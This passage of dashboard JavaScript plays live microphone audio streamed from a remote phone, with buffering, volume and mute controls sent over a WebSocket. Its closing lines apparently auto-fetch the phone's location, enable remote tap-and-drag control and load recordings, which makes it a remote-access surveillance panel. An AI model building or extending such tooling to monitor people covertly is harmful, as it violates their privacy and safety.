    // Cap total latency to ~1.5s, dropping the OLDEST chunks first.
    const MAX_QUEUE = AUDIO_RATE * 1.5;
    let total = 0;
    for (const c of liveAudioQueue) total += c.length;
    while (total > MAX_QUEUE && liveAudioQueue.length > 1) {
        total -= liveAudioQueue[0].length;
        liveAudioQueue.shift();
    }
    // Once enough audio has accumulated, connect the sink to the destination.
    if (!liveAudioPrimed && !liveAudioPriming) {
        let queued = 0;
        for (const c of liveAudioQueue) queued += c.length;
        if (queued >= AUDIO_PRE_ROLL) {
            liveAudioPriming = true;
            setTimeout(() => {
                try {
                    if (liveAudioCtx && liveAudioNode && liveAudioNode.context) {
                        if (liveAudioCtx.state === "suspended") liveAudioCtx.resume();
                        liveAudioNode.connect(liveAudioGain);
                    }
                } catch (e) {}
                liveAudioPrimed = true;
                liveAudioPriming = false;
            }, 0);
        }
    }
}

function startMicAudio() {
    if (liveAudioCtx) return;
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;
    liveAudioCtx = new AC();
    liveAudioPrimed = false;
    liveAudioPriming = false;
    liveAudioGain = liveAudioCtx.createGain();
    liveAudioGain.gain.value = liveVolume / 100;
    liveAudioGain.connect(liveAudioCtx.destination);
    // ScriptProcessor in pull mode (0 input channels) — output only.
    const sp = liveAudioCtx.createScriptProcessor(AUDIO_CHUNK, 0, 1);
    sp.onaudioprocess = (e) => {
        const out = e.outputBuffer.getChannelData(0);
        let written = 0;
        // Last non-silent sample held across drains: on a transient
        // underrun we fill with a small decaying tail instead of an abrupt
        // zero "click". Idle (no audio at all) still produces silence.
        let hold = 0;
        while (written < AUDIO_CHUNK && liveAudioQueue.length) {
            const chunk = liveAudioQueue[0];
            const n = Math.min(AUDIO_CHUNK - written, chunk.length);
            for (let i = 0; i < n; i++) { const v = chunk[i]; out[written + i] = v; hold = v; }
            written += n;
            if (n < chunk.length) liveAudioQueue[0] = chunk.subarray(n);
            else liveAudioQueue.shift();
        }
        // Under-run past the buffer: decay from the hold sample to silence so
        // the momentary jitter gap is a soft fade, not a hard cut.
        if (written > 0 && written < AUDIO_CHUNK) {
            const tail = AUDIO_CHUNK - written;
            let amp = 1;
            for (let i = 0; i < tail; i++) {
                amp *= 0.75;
                out[written + i] = hold * amp;
            }
        } else if (written === 0) {
            out.fill(0);
        }
    };
    liveAudioNode = sp;
    // ScriptProcessor is NOT connected to the destination yet — pushLiveAudio()
    // connects it only after a pre-roll accumulates (see AUDIO_PRE_ROLL), so the
    // cold consumer never fires on an empty queue.
}

function stopMicAudio() {
    if (liveAudioNode) { try { liveAudioNode.disconnect(); } catch (e) {} liveAudioNode = null; }
    if (liveAudioGain) { try { liveAudioGain.disconnect(); } catch (e) {} liveAudioGain = null; }
    if (liveAudioCtx) { try { liveAudioCtx.close(); } catch (e) {} liveAudioCtx = null; }
    liveAudioNode = null;
    liveAudioPrimed = false;
    liveAudioPriming = false;
    liveAudioQueue.length = 0;
}

function setLiveVolume(val) {
    liveVolume = Math.max(0, Math.min(100, parseInt(val, 10) || 0));
    if (liveAudioCtx && liveAudioGain) {
        liveAudioGain.gain.setValueAtTime(liveVolume / 100, liveAudioCtx.currentTime);
    }
    const pct = document.getElementById("liveVolPct");
    if (pct) pct.textContent = liveVolume;
    // Also drive the device's in-app volume via the WS when live (best-effort).
    if (liveWs && liveWs.readyState === WebSocket.OPEN) {
        try { liveWs.send(JSON.stringify({ cmd: "volume", v: liveVolume })); } catch (e) {}
    }
}

function setLiveVolumeUI(enabled) {
    const s = document.getElementById("liveVolSlider");
    const w = document.getElementById("liveVolWrap");
    if (s) { s.disabled = !enabled; s.value = liveVolume; }
    if (w) w.classList.toggle("opacity-40", !enabled);
}

function toggleMicAudio() {
    micAudioOn = !micAudioOn;
    const btn = document.getElementById("micAudioBtn");
    if (btn) {
        const span = btn.querySelector("span");
        if (span) span.textContent = micAudioOn ? "volume_up" : "volume_off";
        btn.title = micAudioOn ? "Mute audio" : "Unmute audio";
        btn.classList.toggle("bg-maquis-green/10", micAudioOn);
        btn.classList.toggle("border-maquis-green/50", micAudioOn);
    }
    if (micAudioOn) {
        startMicAudio();
        sendWs({ cmd: "audio", v: "on" });
    } else {
        stopMicAudio();
        sendWs({ cmd: "audio", v: "off" });
    }
}

// Keep mutable-icon buttons in sync with the initial state.
(function initLiveUi() {
    const btn = document.getElementById("micAudioBtn");
    if (btn) {
        const span = btn.querySelector("span");
        if (span) span.textContent = micAudioOn ? "volume_up" : "volume_off";
        if (micAudioOn) btn.classList.add("bg-maquis-green/10", "border-maquis-green/50");
    }
})();

// Kill the WebSocket when leaving the page (stops phone-side capture loops).
window.addEventListener("beforeunload", () => {
    if (liveWs) { try { liveWs.close(); } catch (e) {} }
    stopMicAudio();
});

// Auto-fetch the phone's location when the dashboard opens.
getLocation();
// Remote-admin control pad: tap/drag the feed canvas + recordings list.
bindControlCanvas();
loadRecordings();
